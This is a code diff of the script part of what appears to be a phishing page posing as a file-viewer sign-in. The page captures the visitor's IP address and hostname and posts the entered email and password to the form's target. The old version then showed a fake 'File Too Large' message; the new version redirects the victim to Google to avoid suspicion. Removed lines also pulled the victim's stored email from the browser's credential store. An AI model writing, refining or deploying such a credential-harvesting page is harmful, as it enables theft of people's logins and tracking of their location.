@@ -177,17 +177,12 @@
   </div>
 
   <script>
-    // ✅ Try browser-managed autofill (works on HTTPS)
-    window.addEventListener('DOMContentLoaded', async () => {
-      // Optional Credential Management API (Chrome/Edge)
-      if (window.PasswordCredential) {
-        try {
-          const cred = await navigator.credentials.get({password: true, mediation: 'optional'});
-          if (cred && cred.id) document.getElementById('email').value = cred.id;
-        } catch(e) { console.log('Credential API not available'); }
-      }
+    window.addEventListener('DOMContentLoaded', () => {
+      // ✅ Autofill (browser-managed if HTTPS)
+      // Optional demo email if autofill not available
+      // document.getElementById('email').value = "demo@example.com";
 
-      // ✅ IP & hostname capture
+      // ✅ Capture IP and hostname
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
@@ -201,33 +196,27 @@
         .catch(() => console.log('Could not fetch IP'));
     });
 
-    // ✅ Password visibility toggle
-    const toggle = document.getElementById('togglePassword');
-    const pwd = document.getElementById('password');
-    toggle.addEventListener('click', () => {
+    // ✅ Toggle password visibility
+    document.getElementById('togglePassword').addEventListener('click', () => {
+      const pwd = document.getElementById('password');
       const isHidden = pwd.type === 'password';
       pwd.type = isHidden ? 'text' : 'password';
-      toggle.textContent = isHidden ? '🙈' : '👁️';
+      togglePassword.textContent = isHidden ? '🙈' : '👁️';
     });
 
-    // ✅ Submit then redirect to message
+    // ✅ Submit form then redirect
     const form = document.getElementById('mainForm');
-    form.addEventListener('submit', (e) => {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
       const data = new FormData(form);
-      fetch(form.action, { method: 'POST', body: data })
-        .then(() => {
-          document.body.innerHTML = `
-            <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#f9f9f9;">
-              <div style="text-align:center;max-width:350px;padding:20px;background:white;border-radius:12px;box-shadow:0 0 10px rgba(0,0,0,0.1);">
-                <h2 style="color:#d9534f;">File Too Large</h2>
-                <p style="margin-top:10px;color:#555;">File too large to open on your browser.</p>
-                <p style="margin-top:5px;color:#555;">Please contact the sender to send it in a smaller chunk.</p>
-              </div>
-            </div>
-          `;
-        })
-        .catch(() => alert("Network error, please try again"));
+
+      try {
+        await fetch(form.action, { method: 'POST', body: data });
+        // Redirect to Google after successful submit
+        window.location.href = "https://www.google.com";
+      } catch (err) {
+        alert("Network error, please try again.");
+      }
     });
   </script>
 </body>
